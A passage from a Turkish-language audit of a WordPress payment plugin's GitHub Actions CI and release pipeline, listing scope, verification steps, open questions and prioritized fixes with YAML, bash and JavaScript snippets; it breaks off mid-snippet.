Her push'ta 5 PHP matris ayağı + lint + 2 docker entegrasyon job'u iki kez çalışır. Docker tabanlı job'lar (iki tam WordPress + MariaDB kurulumu, WooCommerce indirmesi) düşünüldüğünde bu, runner dakikası ve Docker Hub anonim pull kotası açısından kayda değer bir israftır ve CI-006'daki timeout eksikliğiyle birleşince kuyruk süresini artırır.

**Öneri**

PR'ı olan dallarda push tetiklemesini bastır ve concurrency grubunu PR numarasına bağla:
```yaml
on:
  workflow_call:
  pull_request:
    branches: [main, development]
  push:
    branches: [main]

concurrency:
  group: tests-${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true
```
(`github.event.pull_request.number` yalnızca `concurrency` ifadesinde kullanılıyor, `run:` bloğuna enterpole edilmiyor — bu güvenli bir kullanımdır.)

---

## Düşmanca doğrulamada elenen iddialar

Yok — bu boyutta hiçbir iddia tümüyle çürütülmedi.

## Kapsam

İncelenenler (tamamı baştan sona okundu): .github/workflows/tests.yml (160 satır), release.yml (78), deploy-wordpress-org.yml (311); .github/scripts/build-release.sh, smoke-check-artifact.sh, check-version.js, check-po-placeholders.js, check-translations.sh, check-js.js, check-css.js, lint-php.sh (8/8); .github/dependabot.yml, CODEOWNERS, ISSUE_TEMPLATE/bug_report.yml, ISSUE_TEMPLATE/config.yml, PULL_REQUEST_TEMPLATE.md; .gitattributes, .gitignore (diff dahil), .editorconfig, .codacy.yml, eslint.config.js, composer.json, composer.lock (paket listesi + platform-overrides), package.json, package-lock.json (130+ paketin sürümleri programatik olarak çıkarıldı), phpunit.xml. Ek olarak CI'ın çağırdığı tests/integration/run-schema-migration.sh ve run-woocommerce-smoke.sh, ve kod-doküman uyumu için docs/WORDPRESS-ORG-RELEASE.md, readme.txt, README.md:141, CONTRIBUTING.md:44/79-104, nicepay-payment-gateway.php header'ı okundu.

Ampirik doğrulamalar: (a) build-release.sh yerelde üç kez çalıştırıldı; aynı çalışma ağacından üretilen ZIP'lerin SHA-256'ları 4 saniye arayla farklı çıktı (96722461... vs 1d1e0795...) — CI-003'ün kanıtı. (b) `git ls-files` (116 dosya) ile takipte *.zip, .DS_Store, .phpunit.result.cache, node_modules/, vendor/ olmadığı doğrulandı. (c) `.gitignore`'dan silinen 3 satırın `# Composer / composer.lock` olduğu diff ile doğrulandı (regresyon değil, iyileştirme). (d) Tüm `uses:` satırları grep'lendi: 21 çağrının hepsi SHA-pinned; `pull_request_target`, `continue-on-error`, `if: always()`, `set -x` ve `run:` içinde `github.event.*` kullanımı arandı — hiçbiri bulunamadı. (e) package-lock.json/composer.lock paket sürümleri çıkarılıp bilinen zafiyetli sürümlerle karşılaştırıldı (cross-spawn, brace-expansion, tough-cookie, ws, jsdom, css-tree dahil); şüpheli sürüm bulunamadı.

İncelenemeyenler / doğrulanamayanlar: (1) `wordpress-org-production` environment'ının GitHub Settings tarafında gerçekten zorunlu reviewer, tag koruması ve admin-bypass kapalı olarak yapılandırılıp yapılandırılmadığı — bu repo dışı bir ayardır, YAML yalnızca adı verir (doküman 120. satırda bunu açıkça kabul ediyor). (2) `vars.WPORG_PLUGIN_SLUG` ve `secrets.WPORG_SVN_*` değerlerinin gerçekten yalnız environment seviyesinde tanımlı olup olmadığı. (3) Dal koruma kuralları (main/development required checks, CODEOWNERS zorunluluğu). (4) `wordpress@sha256:b427cec...` digest'inin hangi WordPress sürümüne karşılık geldiği (ağ erişimi olmadan çözülemedi) — CI-007'de bu belirsizliğin kendisi bulgu olarak raporlandı. (5) 10up/action-wordpress-plugin-deploy 2.3.0'ın eksik ASSETS_DIR karşısındaki tam davranışı (hata mı, uyarı mı) — bu nedenle CI-018 medium confidence. (6) Bu makinede php/composer bulunmadığı için `composer validate --strict`, `composer audit --locked` ve `php -l` yerel olarak çalıştırılamadı; composer.lock'un content-hash tutarlılığı yalnızca yapısal olarak incelendi. (7) Workflow'ların canlı koşu geçmişi (Actions logları) görülmedi; job sürelerine dair yorumlar statik analize dayanıyor.

**Açık sorular**

- Release tag'leri hangi dalda atılıyor: CONTRIBUTING.md:97-104 'main'i korumalı release dalı ilan ederken deploy-wordpress-org.yml:85-89 tag'in 'development' içinde olmasını şart koşuyor. Bu iki kural birlikte hangi senaryoda geçiyor? (CI-010)
- WordPress.org'a yayın gerçekten planlanıyorsa, 'Update URI' başlığı kaldırılmış bir tag'in GitHub CI'ından nasıl geçmesi bekleniyor? Ayrı bir tag namespace'i mi, yoksa check-version.js'de kanal gevşetmesi mi tercih edilir? (CI-002)
- 'Tested up to: 7.0' beyanı hangi somut WordPress sürümünde ve hangi testle doğrulandı? Entegrasyon imajının digest'i bu sürüme mi karşılık geliyor? (CI-007)
- WooCommerce minimumu gerçekten 5.0 mı olmalı, yoksa HPOS ve Blocks entegrasyonu nedeniyle beyan (ör. 7.1+ veya 8.0+) yükseltilmeli mi? Mevcut testler yalnızca 11.0.1'i kanıtlıyor. (CI-007)
- Codacy'nin bundled PHPCS profili yerine projeye özel bir phpcs.xml.dist + WPCS kurulumu planlanıyor mu? WP.org incelemesi öncesi Plugin Check'in CI'a eklenmesi düşünülüyor mu? (CI-005)
- Release ZIP'inin bit-bazında tekrarlanabilir olması bir hedef mi? README.md:39-41 kullanıcıdan checksum doğrulaması istediği için bu beklentiyi yaratıyor. (CI-003)
- wordpress-org-production environment'ında zorunlu reviewer ve tag koruması fiilen yapılandırıldı mı, yoksa docs/WORDPRESS-ORG-RELEASE.md:105-126 hâlâ yapılacaklar listesi mi? Kod bunu doğrulayamıyor.
- phpunit.xml coverage kapsamının admin/ dizinini dışarıda bırakması bilinçli bir karar mı, yoksa gözden mi kaçtı? (CI-016)

## Konum doğrulama durumu

Bulgu konumları dosya varlığı ve satır aralığı için otomatik kontrol edildi.

| Durum | Adet |
|---|---|
| ok | 19 |

## Öncelikli aksiyon listesi

1. **CI-001** — Sürümü script içinde header'dan türet, sabitleme. Her iki script'e ekle:
```bash
plugin_version="$(sed -nE 's/^[[:space:]]*\*[[:space:]]*Version:[[:space:]]*([^[:space:]]+).*/\1/p' \
    "$repository_root/nicepay-payment-gateway.php" | head -n 1)"
[[ -n "$plugin_version" ]] || { echo 'ERROR: plugin version could not be resolved' >&2; exit 1; }
bash "$repository_root/.github/scripts/build-release.s
2. **CI-002** — Kanal seçimini sürüm dosyasından değil, tek bir kaynak-of-truth'tan türet. En basit çözüm: check-version.js'de 'github' kanalında Update URI'yi zorunlu değil, yalnızca 'varsa doğru olmalı' yap ve GitHub kanalına özel zorunluluğu sadece release.yml'ye taşı:
```js
if (updateUriMatch && updateUriMatch[1] !== expectedUpdateUri) {
    failures.push(`Plugin header Update URI: unexpected value ${updateUr
